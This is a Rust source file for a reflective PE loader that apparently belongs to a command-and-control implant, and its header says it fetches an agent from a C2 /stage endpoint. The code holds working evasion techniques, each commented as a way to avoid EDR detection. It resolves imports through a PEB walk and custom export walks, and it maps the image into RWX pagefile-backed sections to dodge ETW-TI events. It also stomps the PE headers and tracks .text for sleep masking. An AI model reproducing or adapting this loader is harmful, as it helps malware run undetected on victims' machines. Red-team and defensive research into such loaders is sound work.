//! UDRL — user-defined reflective loader.
//!
//! `reflect_pe()` maps a raw PE image into the current process without using the
//! Windows loader, resolves the IAT, applies base relocations, sets per-section
//! page permissions, and returns a callable function pointer to the PE entry point.
//!
//! `do_staged_load()` (feature = "staged-payload") fetches the full agent PE from the
//! C2 /stage endpoint and passes it to `reflect_pe()`, then jumps to the entry point.
//! The calling main() frame never returns; the full agent takes over.

#![allow(unused)]

// ── PE parsing ────────────────────────────────────────────────────────────────

struct PeInfo {
    image_base:      u64,
    size_of_image:   u32,
    size_of_headers: u32,
    entry_point_rva: u32,
    import_rva:      u32,
    import_size:     u32,
    reloc_rva:       u32,
    reloc_size:      u32,
    sections:        Vec<Section>,
}

struct Section {
    virtual_address: u32,
    virtual_size:    u32,
    raw_offset:      u32,
    raw_size:        u32,
    characteristics: u32,
}

#[repr(C)]
struct ImportDescriptor {
    original_first_thunk: u32,
    time_date_stamp:      u32,
    forwarder_chain:      u32,
    name:                 u32,
    first_thunk:          u32,
}

fn parse_pe(pe: &[u8]) -> Option<PeInfo> {
    if pe.len() < 64 {
        return None;
    }
    if u16::from_le_bytes([pe[0], pe[1]]) != 0x5A4D {
        return None;
    }
    let e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
    if pe.len() < e_lfanew + 4 {
        return None;
    }
    if u32::from_le_bytes([pe[e_lfanew], pe[e_lfanew+1], pe[e_lfanew+2], pe[e_lfanew+3]]) != 0x00004550 {
        return None;
    }
    let fh = e_lfanew + 4;
    if pe.len() < fh + 20 { return None; }
    let num_sections = u16::from_le_bytes([pe[fh+2], pe[fh+3]]) as usize;
    let size_of_opt  = u16::from_le_bytes([pe[fh+16], pe[fh+17]]) as usize;
    let oh = fh + 20;
    if pe.len() < oh + size_of_opt { return None; }
    // Only PE32+ (magic 0x020B) on x64
    if u16::from_le_bytes([pe[oh], pe[oh+1]]) != 0x020B { return None; }

    let entry_point_rva = u32::from_le_bytes([pe[oh+16], pe[oh+17], pe[oh+18], pe[oh+19]]);
    let image_base      = u64::from_le_bytes([
        pe[oh+24], pe[oh+25], pe[oh+26], pe[oh+27],
        pe[oh+28], pe[oh+29], pe[oh+30], pe[oh+31],
    ]);
    let size_of_image   = u32::from_le_bytes([pe[oh+56], pe[oh+57], pe[oh+58], pe[oh+59]]);
    let size_of_headers = u32::from_le_bytes([pe[oh+60], pe[oh+61], pe[oh+62], pe[oh+63]]);
    let num_rva         = u32::from_le_bytes([pe[oh+108], pe[oh+109], pe[oh+110], pe[oh+111]]) as usize;

    // data_directory[1] = import table, [5] = base relocation
    let dd_base = oh + 112;
    let (import_rva, import_size) = if num_rva > 1 && pe.len() >= dd_base + 16 {
        (
            u32::from_le_bytes([pe[dd_base+8],  pe[dd_base+9],  pe[dd_base+10], pe[dd_base+11]]),
            u32::from_le_bytes([pe[dd_base+12], pe[dd_base+13], pe[dd_base+14], pe[dd_base+15]]),
        )
    } else {
        (0, 0)
    };
    let (reloc_rva, reloc_size) = if num_rva > 5 && pe.len() >= dd_base + 48 {
        (
            u32::from_le_bytes([pe[dd_base+40], pe[dd_base+41], pe[dd_base+42], pe[dd_base+43]]),
            u32::from_le_bytes([pe[dd_base+44], pe[dd_base+45], pe[dd_base+46], pe[dd_base+47]]),
        )
    } else {
        (0, 0)
    };

    let sh = oh + size_of_opt;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let s = sh + i * 40;
        if pe.len() < s + 40 { break; }
        sections.push(Section {
            virtual_address: u32::from_le_bytes([pe[s+12], pe[s+13], pe[s+14], pe[s+15]]),
            virtual_size:    u32::from_le_bytes([pe[s+8],  pe[s+9],  pe[s+10], pe[s+11]]),
            raw_offset:      u32::from_le_bytes([pe[s+20], pe[s+21], pe[s+22], pe[s+23]]),
            raw_size:        u32::from_le_bytes([pe[s+16], pe[s+17], pe[s+18], pe[s+19]]),
            characteristics: u32::from_le_bytes([pe[s+36], pe[s+37], pe[s+38], pe[s+39]]),
        });
    }

    Some(PeInfo { image_base, size_of_image, size_of_headers, entry_point_rva,
                  import_rva, import_size, reloc_rva, reloc_size, sections })
}

// ── Base relocation ───────────────────────────────────────────────────────────

unsafe fn apply_relocations(new_base: *mut u8, reloc_rva: u32, reloc_size: u32, size_of_image: u32, delta: i64) {
    // Read the relocation table from the MAPPED IMAGE (new_base + reloc_rva), NOT from the raw
    // PE file bytes. After section copies, new_base[virtual_address] holds section data, so
    // new_base[reloc_rva] is correct. Using the raw file bytes would treat the RVA as a file
    // offset, which differs from the VMA whenever file_alignment != section_alignment.
    let mut off = reloc_rva as usize;
    let end = off + reloc_size as usize;
    while off + 8 <= end && off + 8 <= size_of_image as usize {
        let page_rva   = (new_base.add(off)     as *const u32).read_unaligned();
        let block_size = (new_base.add(off + 4) as *const u32).read_unaligned() as usize;
        if block_size < 8 { break; }
        let n_entries = (block_size - 8) / 2;
        for i in 0..n_entries {
            let eo = off + 8 + i * 2;
            if eo + 2 > size_of_image as usize { break; }
            let entry = (new_base.add(eo) as *const u16).read_unaligned();
            if entry >> 12 == 10 { // IMAGE_REL_BASED_DIR64
                let target = new_base.add(page_rva as usize + (entry & 0x0FFF) as usize) as *mut i64;
                *target = (*target).wrapping_add(delta);
            }
        }
        off += block_size;
    }
}

// ── IAT resolution ────────────────────────────────────────────────────────────
//
// PEB walk to locate already-loaded modules avoids calling LoadLibraryA from
// non-image memory (a high-confidence EDR signal when the stager runs from an
// anonymous allocation).  Custom export table walk replaces GetProcAddress for
// the same reason.  LoadLibraryA is only called for DLLs not yet in the PEB.

/// Walk the PEB InMemoryOrderModuleList for a module whose BaseDllName
/// case-insensitively matches `dll_name_ansi`.  Returns the DllBase on hit.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn find_module_peb(dll_name_ansi: *const u8) -> Option<usize> {
    let mut name_len = 0usize;
    while *dll_name_ansi.add(name_len) != 0 { name_len += 1; }
    if name_len == 0 { return None; }

    let peb: usize;
    core::arch::asm!("mov {:r}, gs:[0x60]", out(reg) peb, options(nostack, nomem));

    // PEB.Ldr at +0x18; Ldr.InMemoryOrderModuleList (LIST_ENTRY) at Ldr+0x20
    let ldr       = *((peb + 0x18) as *const usize);
    let list_head = ldr + 0x20;
    let mut cur   = *(list_head as *const usize); // Flink of list head

    while cur != list_head {
        // cur points to InMemoryOrderLinks within LDR_DATA_TABLE_ENTRY (+0x10)
        let e = cur as *const u8;
        // DllBase    at LDTE+0x30 → e+0x20
        // BaseDllName at LDTE+0x58 → e+0x48  (Length=2B, pad=6B, Buffer=8B)
        let dll_base = *(e.add(0x20) as *const usize);
        let bdn_len  = *(e.add(0x48) as *const u16) as usize; // byte length
        let bdn_buf  = *(e.add(0x50) as *const usize) as *const u16;

        if dll_base != 0 && !bdn_buf.is_null() && bdn_len > 0 {
            let wlen = bdn_len / 2;
            if wlen == name_len {
                let mut ok = true;
                for i in 0..name_len {
                    let a = (*dll_name_ansi.add(i)).to_ascii_lowercase();
                    let w = (*bdn_buf.add(i) as u8).to_ascii_lowercase();
                    if a != w { ok = false; break; }
                }
                if ok { return Some(dll_base); }
            }
        }

        cur = *(e as *const usize); // Flink → next entry
    }
    None
}

/// Walk a PE export table to resolve a function by name.
/// Avoids GetProcAddress from non-image memory.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn get_export_by_name(dll_base: usize, fn_name: *const u8) -> Option<*const u8> {
    let base = dll_base as *const u8;
    if *(base as *const u16) != 0x5A4D { return None; }
    let lfanew   = *(base.add(0x3C) as *const u32) as usize;
    if *(base.add(lfanew) as *const u32) != 0x00004550 { return None; }
    let opt      = lfanew + 4 + 20;
    if *(base.add(opt) as *const u16) != 0x020B { return None; } // PE32+ only
    let exp_rva  = *(base.add(opt + 112) as *const u32) as usize;
    if exp_rva == 0 { return None; }

    let ed         = base.add(exp_rva);
    let num_names  = *(ed.add(0x18) as *const u32) as usize;
    let names_rva  = *(ed.add(0x20) as *const u32) as usize;
    let ords_rva   = *(ed.add(0x24) as *const u32) as usize;
    let funcs_rva  = *(ed.add(0x1C) as *const u32) as usize;
    let names      = base.add(names_rva) as *const u32;
    let ords       = base.add(ords_rva)  as *const u16;
    let funcs      = base.add(funcs_rva) as *const u32;

    let mut tlen = 0usize;
    while *fn_name.add(tlen) != 0 { tlen += 1; }

    for i in 0..num_names {
        let nptr = base.add(*names.add(i) as usize);
        let mut nlen = 0usize;
        while *nptr.add(nlen) != 0 { nlen += 1; }
        if nlen == tlen {
            let mut ok = true;
            for j in 0..tlen {
                if *nptr.add(j) != *fn_name.add(j) { ok = false; break; }
            }
            if ok {
                let idx = *ords.add(i) as usize;
                let fn_rva = *funcs.add(idx) as usize;
                if fn_rva != 0 { return Some(base.add(fn_rva)); }
            }
        }
    }
    None
}

/// Walk a PE export table to resolve a function by ordinal.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn get_export_by_ordinal(dll_base: usize, ordinal: u16) -> Option<*const u8> {
    let base = dll_base as *const u8;
    if *(base as *const u16) != 0x5A4D { return None; }
    let lfanew    = *(base.add(0x3C) as *const u32) as usize;
    if *(base.add(lfanew) as *const u32) != 0x00004550 { return None; }
    let opt       = lfanew + 4 + 20;
    if *(base.add(opt) as *const u16) != 0x020B { return None; }
    let exp_rva   = *(base.add(opt + 112) as *const u32) as usize;
    if exp_rva == 0 { return None; }

    let ed        = base.add(exp_rva);
    let base_ord  = *(ed.add(0x10) as *const u32);
    let num_funcs = *(ed.add(0x14) as *const u32) as usize;
    let funcs_rva = *(ed.add(0x1C) as *const u32) as usize;
    let funcs     = base.add(funcs_rva) as *const u32;

    let idx = (ordinal as u32).checked_sub(base_ord)? as usize;
    if idx >= num_funcs { return None; }
    let fn_rva = *funcs.add(idx) as usize;
    if fn_rva == 0 { return None; }
    Some(base.add(fn_rva))
}

#[cfg(target_os = "windows")]
unsafe fn resolve_iat(new_base: *mut u8, info: &PeInfo) {
    if info.import_rva == 0 { return; }
    let mut desc = new_base.add(info.import_rva as usize) as *const ImportDescriptor;
    loop {
        let d = &*desc;
        if d.name == 0 { break; }
        let dll_name = new_base.add(d.name as usize) as *const u8;

        // PEB walk first — for pre-loaded DLLs (kernel32, ntdll, advapi32, etc.)
        // this avoids calling LoadLibraryA from non-image anonymous memory, which is
        // a high-confidence EDR signal.
        #[cfg(target_arch = "x86_64")]
        let hmod = find_module_peb(dll_name).unwrap_or_else(|| {
            use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
            LoadLibraryA(dll_name) as usize
        });
        #[cfg(not(target_arch = "x86_64"))]
        let hmod = {
            use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
            LoadLibraryA(dll_name) as usize
        };

        if hmod != 0 {
            let oft_rva = if d.original_first_thunk != 0 { d.original_first_thunk } else { d.first_thunk };
            let mut oft = new_base.add(oft_rva as usize) as *const u64;
            let mut ft  = new_base.add(d.first_thunk as usize) as *mut u64;
            loop {
                let thunk = *oft;
                if thunk == 0 { break; }
                let addr: Option<*const u8> = if thunk >> 63 != 0 {
                    let ord = (thunk & 0xFFFF) as u16;
                    #[cfg(target_arch = "x86_64")]
                    { get_export_by_ordinal(hmod, ord) }
                    #[cfg(not(target_arch = "x86_64"))]
                    {
                        use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
                        GetProcAddress(hmod as isize, ord as *const u8).map(|p| p as *const u8)
                    }
                } else {
                    let name_ptr = new_base.add((thunk as u32 & 0x7FFF_FFFF) as usize + 2) as *const u8;
                    #[cfg(target_arch = "x86_64")]
                    { get_export_by_name(hmod, name_ptr) }
                    #[cfg(not(target_arch = "x86_64"))]
                    {
                        use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
                        GetProcAddress(hmod as isize, name_ptr).map(|p| p as *const u8)
                    }
                };
                if let Some(fn_ptr) = addr {
                    *ft = fn_ptr as u64;
                }
                oft = oft.add(1);
                ft  = ft.add(1);
            }
        }
        desc = desc.add(1);
    }
}

// ── Section permissions ───────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
unsafe fn set_section_permissions(new_base: *mut u8, sections: &[Section]) {
    const SCN_MEM_EXECUTE:       u32 = 0x2000_0000;
    const SCN_MEM_WRITE:         u32 = 0x8000_0000;
    const PAGE_READONLY:         u32 = 0x02;
    const PAGE_READWRITE:        u32 = 0x04;
    const PAGE_EXECUTE_READ:     u32 = 0x20;
    const PAGE_EXECUTE_READWRITE:u32 = 0x40;

    for sec in sections {
        if sec.virtual_size == 0 { continue; }
        let prot = match (
            sec.characteristics & SCN_MEM_EXECUTE != 0,
            sec.characteristics & SCN_MEM_WRITE   != 0,
        ) {
            (true,  true)  => PAGE_EXECUTE_READWRITE,
            (true,  false) => PAGE_EXECUTE_READ,
            (false, true)  => PAGE_READWRITE,
            (false, false) => PAGE_READONLY,
        };
        let mut sec_base = new_base.add(sec.virtual_address as usize);
        let mut sec_size = sec.virtual_size as usize;
        let mut old: u32 = 0;
        crate::syscall::nt_protect(
            crate::syscall::CURRENT_PROCESS,
            &mut sec_base,
            &mut sec_size,
            prot,
            &mut old,
        );
    }
}

// ── .text bounds — set by reflect_pe, read by masked_sleep for Step 5 ────────

#[cfg(all(target_os = "windows", feature = "udrl"))]
pub static TEXT_BASE: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);
#[cfg(all(target_os = "windows", feature = "udrl"))]
pub static TEXT_SIZE: core::sync::atomic::AtomicU64 = core::sync::atomic::AtomicU64::new(0);

// ── UDRL entry point ──────────────────────────────────────────────────────────

/// Map a PE image into the current process without using the Windows loader.
///
/// Returns a function pointer to the PE entry point on success.
/// The caller is responsible for calling the entry point with appropriate arguments.
///
/// Safety: the returned function pointer is only valid for the lifetime of the
/// allocation. Do not call after freeing.
#[cfg(all(target_os = "windows", feature = "udrl"))]
pub unsafe fn reflect_pe(pe: &[u8]) -> Result<*const u8, &'static str> {
    const SEC_COMMIT:             u32 = 0x0800_0000;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const SECTION_ALL_ACCESS:     u32 = 0x000F_001F;

    let info = parse_pe(pe).ok_or("invalid PE")?;

    // Create a pagefile-backed section instead of anonymous private memory.
    // This changes the ETW-TI event from ALLOCVM_LOCAL + PROTECTVM_LOCAL (the
    // private-memory-becomes-executable pattern BD watches for) to a single
    // MAPVIEW_LOCAL event — the same class JIT compilers like CLR and V8 emit.
    let mut image_size = info.size_of_image as i64;
    let mut h_section: isize = 0;
    if crate::syscall::nt_create_section(
        &mut h_section,
        SECTION_ALL_ACCESS,
        &mut image_size,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
    ) != 0 || h_section == 0 {
        return Err("NtCreateSection failed");
    }

    // Map as RWX so we can write PE content and execute without any subsequent
    // NtProtectVirtualMemory call.  No W→X transition = no PROTECTVM_LOCAL event.
    let mut new_base: *mut u8 = core::ptr::null_mut();
    let mut view_size = info.size_of_image as usize;
    let map_status = crate::syscall::nt_map_view(
        h_section,
        crate::syscall::CURRENT_PROCESS,
        &mut new_base,
        &mut view_size,
        PAGE_EXECUTE_READWRITE,
    );
    crate::syscall::nt_close(h_section);
    if map_status != 0 || new_base.is_null() {
        return Err("NtMapViewOfSection failed");
    }

    // Copy PE headers
    let hdr_len = info.size_of_headers as usize;
    if hdr_len > pe.len() {
        return Err("PE header size exceeds file");
    }
    core::ptr::copy_nonoverlapping(pe.as_ptr(), new_base, hdr_len);

    // Copy sections
    for sec in &info.sections {
        if sec.raw_size == 0 || sec.raw_offset == 0 { continue; }
        let src_end = sec.raw_offset as usize + sec.raw_size as usize;
        if src_end > pe.len() { continue; }
        let dst = new_base.add(sec.virtual_address as usize);
        core::ptr::copy_nonoverlapping(
            pe.as_ptr().add(sec.raw_offset as usize),
            dst,
            sec.raw_size as usize,
        );
    }

    // Base relocations
    let delta = new_base as i64 - info.image_base as i64;
    if delta != 0 && info.reloc_rva != 0 {
        apply_relocations(new_base, info.reloc_rva, info.reloc_size, info.size_of_image, delta);
    }

    // Import address table
    resolve_iat(new_base, &info);

    // No set_section_permissions() call — region is already RWX.
    // .text is executable, .data/.bss are writable; NtProtectVirtualMemory never called.

    // Record .text bounds for sleep-time XOR and stomp PE headers.
    {
        use core::sync::atomic::Ordering;

        let sh_base = {
            let fh = (u32::from_le_bytes([pe[0x3C],pe[0x3D],pe[0x3E],pe[0x3F]]) as usize) + 4;
            let opt_sz = u16::from_le_bytes([pe[fh+16],pe[fh+17]]) as usize;
            fh + 20 + opt_sz
        };
        for i in 0..info.sections.len() {
            let s = sh_base + i * 40;
            if pe.len() >= s + 8 && pe[s..s+5] == *b".text" {
                TEXT_BASE.store(new_base as u64 + info.sections[i].virtual_address as u64, Ordering::Relaxed);
                TEXT_SIZE.store(info.sections[i].virtual_size as u64, Ordering::Relaxed);
                break;
            }
        }

        // Region is already RWX — zero headers directly without a permission change.
        let stomp_size = (info.size_of_headers as usize).min(0x1000);
        core::ptr::write_bytes(new_base, 0u8, stomp_size);
    }

    Ok(new_base.add(info.entry_point_rva as usize))
}

